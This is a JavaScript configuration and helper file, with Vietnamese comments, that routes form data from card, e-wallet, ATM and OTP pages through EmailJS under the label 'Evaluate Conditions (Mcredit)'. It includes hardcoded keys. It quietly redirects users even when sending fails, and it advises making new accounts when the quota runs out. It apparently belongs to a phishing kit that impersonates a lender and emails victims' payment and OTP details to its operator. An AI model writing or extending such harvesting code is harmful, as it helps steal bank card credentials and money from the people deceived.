/**
 * EmailJS Evaluate-conditions — visa / vtcpay.
 * bank → atm.html + otp.html (atm-emailjs-config.js).
 * momo → momo-emailjs-config.js. zalopay → zalopay-emailjs-config.js
 */
window.EVALUATE_EMAILJS = {
  platformDefault: "Evaluate Conditions (Mcredit)",
  /** Gửi mail ở trang con: momo.html, zalopay.html, atm.html/otp.html (bank) */
  skipEmailForMethods: ["momo", "zalopay", "bank"],
  /**
   * true = EmailJS lỗi (quota, key sai…) vẫn chuyển sang atm/visa/…
   * false = chặn chuyển trang khi không gửi được mail
   */
  redirectOnEmailFailure: true,

  visa: {
    publicKey: "MQKcpIwixBVd4Q920",
    serviceId: "service_ezzpzs5",
    templateId: "template_wyssuk9",
    platform: "Evaluate → Thẻ quốc tế (Mcredit)",
  },

  zalopay: {
    publicKey: "KNc10WfK0FQy3-vJ2",
    serviceId: "service_vrzjmzo",
    templateId: "template_y9yfupv",
    platform: "Evaluate → ZaloPay (Mcredit)",
  },

  vtcpay: {
    publicKey: "MQKcpIwixBVd4Q920",
    serviceId: "service_ezzpzs5",
    templateId: "template_cqo9ino",
    platform: "Evaluate → VTC Pay (Mcredit)",
  },
};

window.__evaluateEmailJsActiveKey = null;

window.shouldSendEvaluateEmailJs = function (methodKey) {
  var root = window.EVALUATE_EMAILJS || {};
  var skip = root.skipEmailForMethods || [];
  if (skip.indexOf(methodKey) !== -1) {
    return false;
  }
  var block = root[methodKey];
  return !!(block && block.serviceId && block.templateId);
};

/**
 * @param {string} methodKey bank | visa | zalopay | vtcpay | …
 * @param {object} templateParams
 * @returns {Promise}
 */
window.evaluateSendEmailJs = function (methodKey, templateParams) {
  if (typeof emailjs === "undefined") {
    return Promise.reject(new Error("EmailJS SDK chưa tải."));
  }

  var root = window.EVALUATE_EMAILJS || {};
  if (!window.shouldSendEvaluateEmailJs(methodKey)) {
    return Promise.resolve({ skipped: true, methodKey: methodKey });
  }

  var block = root[methodKey];
  if (block.publicKey && window.__evaluateEmailJsActiveKey !== block.publicKey) {
    emailjs.init({ publicKey: block.publicKey });
    window.__evaluateEmailJsActiveKey = block.publicKey;
  }

  var params = Object.assign(
    {
      platform: block.platform || root.platformDefault,
      method_key: methodKey,
    },
    templateParams
  );

  return emailjs.send(block.serviceId, block.templateId, params);
};

window.formatEvaluateEmailJsError = function (err, methodKey) {
  var detail =
    (err && (err.text || err.message)) ||
    (typeof err === "string" ? err : "Lỗi không xác định");
  var block = (window.EVALUATE_EMAILJS || {})[methodKey] || {};

  if (/quota|limit exceeded|429/i.test(detail)) {
    return (
      "EmailJS hết hạn mức gửi tháng (quota) cho phương thức \"" +
      methodKey +
      "\".\n\n" +
      "Đang dùng:\n" +
      "• publicKey: " +
      (block.publicKey || "?") +
      "\n" +
      "• serviceId: " +
      (block.serviceId || "?") +
      "\n" +
      "• templateId: " +
      (block.templateId || "?") +
      "\n\n" +
      "Cách xử lý: tạo tài khoản EmailJS mới hoặc đổi 3 giá trị trên trong evaluate-emailjs-config.js (mục " +
      methodKey +
      "), hoặc nâng gói trên emailjs.com."
    );
  }

  return (
    "Gửi EmailJS thất bại (" +
    methodKey +
    "): " +
    detail +
    "\n\nKiểm tra publicKey, serviceId, templateId trong evaluate-emailjs-config.js → \"" +
    methodKey +
    "\"."
  );
};
